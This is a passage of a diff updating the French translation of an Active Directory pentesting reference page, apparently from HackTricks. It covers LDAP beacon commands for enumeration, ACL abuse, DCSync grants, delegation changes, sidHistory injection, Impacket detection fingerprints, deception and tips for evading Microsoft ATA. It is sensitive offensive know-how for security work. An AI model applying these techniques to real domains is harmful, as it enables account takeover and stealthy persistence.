-- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
-- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
-- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
-- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
+- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, et `get-groupmembers` résolvent les noms courts/chemins OU en DNs complets et affichent les objets correspondants.
+- `get-object`, `get-attribute`, et `get-domaininfo` récupèrent des attributs arbitraires (y compris les security descriptors) ainsi que les métadonnées forest/domain depuis `rootDSE`.
+- `get-uac`, `get-spn`, `get-delegation`, et `get-rbcd` exposent directement via LDAP les candidats au roasting, les paramètres de delegation, et les descripteurs [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) existants.
+- `get-acl` et `get-writable --detailed` analysent la DACL pour lister les trustees, les droits (GenericAll/WriteDACL/WriteOwner/attribute writes), et l’héritage, fournissant immédiatement des cibles pour l’escalade de privilèges ACL.
 ```powershell
 ldap get-users --ldaps
 ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
 ldap get-writable --detailed
 ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
 ```
-### Primitives d’écriture LDAP pour l’escalade et la persistance
+### Primitive LDAP d’écriture pour l’escalade et la persistance
 
-- Les BOFs de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principals ou comptes machine partout où des droits sur l’OU existent. `add-groupmember`, `set-password`, `add-attribute`, et `set-attribute` détournent directement les cibles une fois que des droits write-property sont trouvés.
-- Les commandes centrées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, et `add-dcsync`, transforment WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mot de passe, contrôle de l’appartenance à des groupes, ou privilèges de réplication DCSync, sans laisser d’artefacts PowerShell/ADSI. Les contreparties `remove-*` nettoient les ACE injectées.
+- Les BOFs de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principals ou comptes machine partout où des droits sur les OU existent. `add-groupmember`, `set-password`, `add-attribute`, et `set-attribute` détournent directement des cibles une fois les droits write-property trouvés.
+- Les commandes centrées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, et `add-dcsync`, transforment WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisation de mot de passe, contrôle de l’appartenance aux groupes, ou privilèges de réplication DCSync sans laisser d’artefacts PowerShell/ADSI. Les contreparties `remove-*` nettoient les ACE injectées.
 
-### Delegation, roasting, et abus Kerberos
+### Delegation, roasting, et abus de Kerberos
 
-- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis Kerberoastable ; `add-asreproastable` (bascule UAC) le marque pour le AS-REP roasting sans toucher au mot de passe.
-- Les macros de delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, en activant les chemins d’attaque constrained/unconstrained/RBCD et en supprimant le besoin de PowerShell distant ou de RSAT.
+- `add-spn`/`set-spn` rendent immédiatement un utilisateur compromis Kerberoastable ; `add-asreproastable` (bascule UAC) le marque pour AS-REP roasting sans toucher au mot de passe.
+- Les macros de delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les indicateurs UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, permettant des chemins d’attaque constrained/unconstrained/RBCD et éliminant le besoin de PowerShell distant ou de RSAT.
 
-### Injection de sidHistory, déplacement d’OU, et modelage de la surface d’attaque
+### Injection sidHistory, déplacement d’OU, et façonnage de la surface d’attaque
 
-- `add-sidhistory` injecte des SIDs privilégiés dans le SID history d’un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant une héritage d’accès furtif entièrement via LDAP/LDAPS.
-- `move-object` modifie le DN/OU des ordinateurs ou des utilisateurs, permettant à un attaquant de déplacer des assets dans des OUs où des droits délégués existent déjà avant d’exploiter `set-password`, `add-groupmember`, ou `add-spn`.
-- Des commandes de suppression à portée étroite (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après la récupération de credentials ou la mise en place de persistance, en minimisant la télémétrie.
+- `add-sidhistory` injecte des SID privilégiés dans l’historique SID d’un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant un héritage d’accès furtif entièrement via LDAP/LDAPS.
+- `move-object` change le DN/OU des ordinateurs ou utilisateurs, permettant à un attaquant de déplacer des actifs dans des OUs où des droits délégués existent déjà avant d’abuser de `set-password`, `add-groupmember`, ou `add-spn`.
+- Les commandes de suppression à portée étroite (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après que l’opérateur a récupéré des identifiants ou mis en place une persistance, en minimisant la télémétrie.
 
 ## AD -> Azure & Azure -> AD
 
@@ -923,56 +970,56 @@ https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-move
 
 ### **Mesures défensives pour la protection des credentials**
 
-- **Restrictions pour les Domain Admins** : il est recommandé d’autoriser les Domain Admins à se connecter uniquement aux Domain Controllers, afin d’éviter leur utilisation sur d’autres hôtes.
-- **Privilèges des comptes de service** : les services ne doivent pas être exécutés avec des privilèges Domain Admin (DA) afin de maintenir la sécurité.
-- **Limitation temporelle des privilèges** : pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être fait avec : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
-- **Atténuation du LDAP relay** : auditer les Event IDs 2889/3074/3075 puis imposer le LDAP signing et le channel binding LDAPS sur les DCs/clients pour bloquer les tentatives de LDAP MITM/relay.
+- **Restrictions pour les Domain Admins**: Il est recommandé d’autoriser les Domain Admins à se connecter uniquement aux Domain Controllers, en évitant leur utilisation sur d’autres hôtes.
+- **Privilèges des comptes de service**: Les services ne devraient pas être exécutés avec des privilèges Domain Admin (DA) afin de maintenir la sécurité.
+- **Limitation temporelle des privilèges**: Pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être fait avec : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
+- **Atténuation du LDAP relay**: Auditez les Event IDs 2889/3074/3075 puis imposez le LDAP signing et le LDAPS channel binding sur les DCs/clients pour bloquer les tentatives de LDAP MITM/relay.
 
 {{#ref}}
 ldap-signing-and-channel-binding.md
 {{#endref}}
 
-### Empreinte au niveau protocolaire de l’activité Impacket
+### Fingerprinting au niveau protocolaire de l’activité Impacket
 
-Si vous voulez détecter les techniques AD courantes, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur** tels que les binaires renommés, les noms de services, les fichiers batch temporaires ou les chemins de sortie. Établissez une base de référence sur la manière dont les clients Windows légitimes génèrent du trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, et WMI, puis recherchez les **particularités d’implémentation** qui subsistent même après que l’opérateur a modifié `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ou `ntlmrelayx.py`.
+Si vous voulez détecter les techniques AD courantes, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur** tels que les binaires renommés, les noms de service, les fichiers batch temporaires ou les chemins de sortie. Établissez un baseline sur la manière dont les clients Windows légitimes génèrent du trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, et WMI, puis cherchez les **particularités d’implémentation** qui restent même après que l’opérateur a modifié `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ou `ntlmrelayx.py`.
 
-- **Candidats autonomes à forte confiance** (après validation contre votre propre baseline) :
+- **Candidats autonomes à forte confiance** (après validation par rapport à votre propre baseline) :
 - DCE/RPC authentifié utilisant `auth_context_id = 79231 + ctx_id`
 - Padding d’authentification DCE/RPC rempli avec `0xff`
-- Bind Kerberos LDAP qui place un `AP-REQ` Kerberos brut directement dans le `mechToken` SPNEGO
-- Requêtes SMB2/3 negotiate avec des valeurs de `ClientGuid` ressemblant à de l’ASCII
-- WMI `IWbemLevel1Login::NTLMLogin` utilisant le namespace non standard `//./root/cimv2`
+- LDAP Kerberos binds qui placent un `AP-REQ` Kerberos brut directement dans le `mechToken` SPNEGO
+- Requêtes de négociation SMB2/3 avec des valeurs `ClientGuid` ressemblant à de l’ASCII
+- WMI `IWbemLevel1Login::NTLMLogin` utilisant l’espace de noms non standard `//./root/cimv2`
 - Valeurs de nonce Kerberos codées en dur
-- **Mieux comme signaux de corrélation/de scoring** :
+- **Mieux comme signaux de corrélation/scoring** :
 - Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituel/manquant, ou ordre des etypes dans les TGS-REQ différent de celui de Windows natif
 - Messages NTLM Type 1 sans information de version ou messages Type 3 avec des noms d’hôte nuls
-- NTLMSSP brut transporté dans DCE/RPC au lieu de SPNEGO, vérification trailers DCE/RPC manquants, ou incohérences d’OID SPNEGO/Kerberos
-- Plusieurs de ces traits provenant du même hôte/utilisateur/intervalle de session/temps sont bien plus forts qu’un seul champ faible
-- **À utiliser comme enrichissement, pas comme alertes autonomes** :
-- Noms de fichiers par défaut, chemins de sortie, noms de services aléatoires, noms de batch temporaires, noms de comptes machine par défaut, et chaînes HTTP/WebDAV/RDP/MSSQL spécifiques à l’outil
-- Ceux-ci sont faciles à modifier pour les opérateurs et servent surtout à expliquer pourquoi un cluster inter-protocoles est suspect
+- NTLMSSP brut transporté dans DCE/RPC au lieu de SPNEGO, trailers de vérification DCE/RPC manquants, ou décalages d’OID SPNEGO/Kerberos
+- Plusieurs de ces caractéristiques provenant du même hôte/utilisateur/fenêtre temporelle sont bien plus révélatrices qu’un seul champ faible
+- **À utiliser pour l’enrichissement, pas comme alertes autonomes** :
+- Noms de fichiers par défaut, chemins de sortie, noms de service aléatoires, noms de batch temporaires, noms de comptes machine par défaut, et chaînes HTTP/WebDAV/RDP/MSSQL spécifiques à l’outil
+- Ceux-ci sont faciles à modifier pour les opérateurs et servent surtout à expliquer pourquoi un cluster multi-protocole est suspect
 - **Notes opérationnelles** :
 - Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, ou une visibilité côté service
-- Validez face aux clients Samba/Linux, aux appliances, et aux logiciels legacy avant de les promouvoir en alertes
-- Faites monter les détections de l’enrichissement -> hunting -> alerting au fur et à mesure que vous gagnez en confiance dans la baseline
+- Validez avec des clients Samba/Linux, des appliances, et des logiciels legacy avant de les promouvoir en alertes
+- Faites monter les détections de l’enrichissement -> hunting -> alerting au fur et à mesure que vous gagnez en confiance dans le baseline
 
 ### **Implémentation de techniques de deception**
 
-- L’implémentation de deception consiste à poser des pièges, comme des utilisateurs ou des ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n’expirent pas ou qui sont marqués comme Trusted for Delegation. Une approche détaillée inclut la création d’utilisateurs avec des droits spécifiques ou leur ajout à des groupes à privilèges élevés.
+- L’implémentation de la deception consiste à poser des pièges, comme des utilisateurs ou des ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n’expirent pas ou qui sont marqués comme Trusted for Delegation. Une approche détaillée comprend la création d’utilisateurs avec des droits spécifiques ou leur ajout à des groupes à privilèges élevés.
 - Un exemple pratique consiste à utiliser des outils comme : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
-- Plus d’informations sur le déploiement de techniques de deception peuvent être trouvées sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).
+- Plus d’informations sur le déploiement de techniques de deception sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).
 
 ### **Identifier la deception**
 
-- **Pour les objets User** : les indicateurs suspects incluent un ObjectSID atypique, des logons peu fréquents, des dates de création, et de faibles compteurs de bad password.
-- **Indicateurs généraux** : comparer les attributs de possibles objets leurres avec ceux de vrais objets peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier de telles deceptions.
+- **Pour les objets User** : Les indicateurs suspects incluent un ObjectSID atypique, des logons peu fréquents, des dates de création, et de faibles comptes de mauvais mots de passe.
+- **Indicateurs généraux** : Comparer les attributs d’objets leurres potentiels avec ceux d’objets authentiques peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier de telles deceptions.
 
 ### **Contourner les systèmes de détection**
 
 - **Contournement de la détection Microsoft ATA** :
-- **Énumération des users** : éviter l’énumération des sessions sur les Domain Controllers pour empêcher la détection ATA.
-- **Impersonation de tickets** : l’utilisation de clés **aes** pour la création de tickets aide à échapper à la détection en évitant de rétrograder vers NTLM.
-- **Attaques DCSync** : il est conseillé d’exécuter depuis un non-Domain Controller pour éviter la détection ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.
+- **Énumération des utilisateurs** : Éviter l’énumération des sessions sur les Domain Controllers pour empêcher la détection ATA.
+- **Impersonation de ticket** : Utiliser des clés **aes** pour la création de tickets aide à échapper à la détection en évitant de rétrograder vers NTLM.
+- **Attaques DCSync** : Il est conseillé d’exécuter depuis un poste non-Domain Controller pour éviter la détection ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.
 
 ## Références
 
@@ -984,5 +1031,7 @@ Si vous voulez détecter les techniques AD courantes, **ne vous fiez pas uniquem
 - [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
 - [Hashcat](https://github.com/hashcat/hashcat)
 - [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
+- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
+- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)
 
 {{#include ../../banners/hacktricks-training.md}}
